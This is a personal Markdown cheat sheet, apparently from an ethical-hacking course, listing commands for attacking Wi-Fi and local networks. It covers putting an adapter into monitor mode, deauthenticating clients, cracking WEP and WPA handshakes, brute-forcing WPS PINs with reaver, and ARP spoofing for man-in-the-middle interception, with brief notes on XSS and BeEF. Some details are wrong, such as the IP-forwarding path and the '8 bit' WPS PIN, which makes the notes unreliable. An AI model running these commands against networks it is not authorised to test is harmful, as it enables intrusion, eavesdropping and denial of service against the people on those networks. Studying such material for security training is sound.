# dump
Contains non relevant info that I wanna dump


## Table of Content
1. Network Hacking
    1. Pre-connection Attack
    1. Gaining Access
    1. Post-connection Attack
1. Gaining Access
1. Post exploitation
1. Website Hacking 
---

```
iwconfig : Gived info about wireless adapter
ifconfig [interface name] down/up : Make the interface up/down
airmon-ng check kill
iwconfig [interface-name] mode monitor : Changes wireless mode from managed to monitor
ifconfig [interface-name] hw ether [Your_Desired_MAC_Adress]
```

### airodump-ng : Used by wireless interface in monitor mode to capture packet
```
airodump-ng [interface-name] : Sniffs all the wireless network around with their protection level(Open/WEP/WPA/WPA2) and other critical info

airodump-ng --band [a,b,g,n] [interface-name] : capture packet in band specified

airodump-ng --bssid [bssid] --channel [channel number] --write [filename] [interface-name]

aireplay-ng --deauth  100000 -a [access mac] -c [client mac] [interface-name] : Disable a user from using wi-fi
```

### aircrack-ng : Used to crack WEP(IV + key) 
```
aircrack-ng [cap-file-name]
```

### aireplay-ng : Used to generate fake traffic. It comes handy if target wifi is not generating enough traffic
```
aireplay-ng --fakeauth 0 -a [mac-of-AP] -h [mac-of wireless-adapter] [interface-name] : For assocaiation
aireplay-ng --arpreplay  -b [mac-of-AP] -h [mac-of wireless-adapter] [interface-name]
```

### Cracking WPA/WPA2
Only difference in encrption used for message integrity
WPA: TKIP
WPA2: CCMP

WPS: Can be exploited. It was designed to simplify connecting to wireless. Only way to prevent against this is enabling PBC(Push button connect)

```
wash --interface [interface-name] : Shows all the wifi with wps enabled
reaver --bssid [bssid] --channel [channel number] --interface [interface-name] -vvv --no-associate : Bruteforce 8 bit WPS pin which is then used to compute WPA Passkey
```

#### Wordlist Attack
```
MIC of handshake + word list 
aircrack-ng [handshake-capture-file]-w [wordlist] 
```
---
#### Creating Wordlist
crunch [min] [max] [character] -t [pattern] -o [filename]


---
### NetDiscover and Nmap
```
netdiscover -r [range-of-ip] : IPs and Vendor of devices connected to the same network
```

Nmap: Gives information about open port, operating system and running services.
Zenmap: GUI warpper over Nmap


### MITM Attack
Multiple ways to attain this. One way is ARP spoofing.

arpspoof -i [interface-name] -t [target_ip] [gateway_ip]
arpspoof -i [interface-name] -t [gateway_ip] [target_ip]

After these two commands, arp is spoofed but still we has to force out computer to work as router
echo 1 > /proc/sys/ipv4/ip_forward


BetterCap: better than arpspoof.


### XSS
Persistent XSS : Stored in DB
Reflected XSS : Run on a specific URL
DOM based XSS : 

**Beef** : Used for XSS attack

### ZAP : Zed attach proxy
Automatically find vulnerabilities in web application.